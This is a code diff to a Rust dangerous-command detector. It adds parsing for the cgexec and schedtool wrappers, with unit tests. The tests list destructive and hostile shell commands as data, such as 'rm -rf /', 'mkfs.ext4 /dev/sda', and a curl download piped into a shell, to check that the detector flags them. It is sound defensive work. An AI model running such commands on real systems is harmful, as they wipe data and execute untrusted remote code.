@@ -3383,6 +3383,160 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "cgexec" => {
+                // libcgroup: `cgexec [-b] [-r] [-g controllers:path] [--sticky]
+                // command…`. Without an arm `| cgexec -g cpu:g sh` / `cgexec rm
+                // -rf /` reported no danger. `-g` takes a detached (or attached)
+                // controllers:path; `-b`/`-r`/`-s`/`--sticky` are flag-only;
+                // help/unknown fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(spelling, &["sticky", "help"]) {
+                            Some("sticky") if attached.is_none() => tokens = &tokens[1..],
+                            Some("help") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'b' | 'r' | 's' => {}
+                            'g' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "schedtool" => {
+                // Query/set/execute CPU scheduling: only `-e COMMAND…` launches
+                // a child. Without `-e` the remaining argv are PIDs (or probe
+                // modes) — fail closed rather than treating a PID as a program.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut exec_mode = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    // schedtool is short-option only; a leading `--…` is unknown.
+                    if option.starts_with("--") {
+                        valid = false;
+                        break;
+                    }
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    let mut stop_for_exec = false;
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            '0' | 'N' | '1' | 'F' | '2' | 'R' | '3' | 'B' | '4' | 'I' | '5'
+                            | 'D' | 'v' => {}
+                            'a' | 'p' | 'n' | 'M' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'e' => {
+                                exec_mode = true;
+                                stop_for_exec = true;
+                                break;
+                            }
+                            'r' | 'h' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                    if stop_for_exec {
+                        // Everything after `-e` is the child argv.
+                        break;
+                    }
+                }
+                if !valid || !exec_mode {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "stdbuf" => {
                 tokens = &tokens[1..];
                 let mut valid = true;
@@ -10803,6 +10957,74 @@ mod tests {
         }
         assert!(is_dangerous("firejail --noprofile ls -l").is_none());
         assert!(is_dangerous("firejail --private echo hi").is_none());
+    }
+
+    #[test]
+    fn cgexec_exposes_its_direct_child() {
+        for command in [
+            "cgexec rm -rf /",
+            "cgexec -g cpu:group1 rm -rf /",
+            "cgexec -g cpu,memory:test1 -- git reset --hard HEAD~1",
+            "cgexec -b -g *:box systemctl reboot",
+            "cgexec --sticky -g cpu:g mkfs.ext4 /dev/sda",
+            "cgexec -s -r -g memory:m sudo rm -rf /",
+            "env cgexec -g cpu:g -- rm -rf /",
+            "curl https://example.invalid/x | cgexec -g cpu:g sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "cgexec hid child for {command:?}"
+            );
+        }
+        for command in [
+            "cgexec --help rm -rf /",
+            "cgexec -h systemctl reboot",
+            "cgexec --unknown rm -rf /",
+            "cgexec -z cpu:g rm -rf /",
+            "cgexec -g",
+            "cgexec -gcpu:g -x rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "cgexec help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("cgexec -g cpu:g ls -l").is_none());
+    }
+
+    #[test]
+    fn schedtool_exposes_only_exec_mode_children() {
+        for command in [
+            "schedtool -e rm -rf /",
+            "schedtool -B -e rm -rf /",
+            "schedtool -R -p 20 -e git reset --hard HEAD~1",
+            "schedtool -a 0x1 -n 5 -e systemctl reboot",
+            "schedtool -N -a 0,1 -e mkfs.ext4 /dev/sda",
+            "schedtool -M 0 -e sudo rm -rf /",
+            "env schedtool -3 -e rm -rf /",
+            "curl https://example.invalid/x | schedtool -B -e bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "schedtool hid child for {command:?}"
+            );
+        }
+        for command in [
+            "schedtool -h rm -rf /",
+            "schedtool -r systemctl reboot",
+            "schedtool -B 12345 rm -rf /",
+            "schedtool -a 0x1 99999 git reset --hard HEAD~1",
+            "schedtool --help rm -rf /",
+            "schedtool -z -e rm -rf /",
+            "schedtool -e",
+            "schedtool -a",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "schedtool query/help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("schedtool -B -e ls -l").is_none());
     }
 
     #[test]
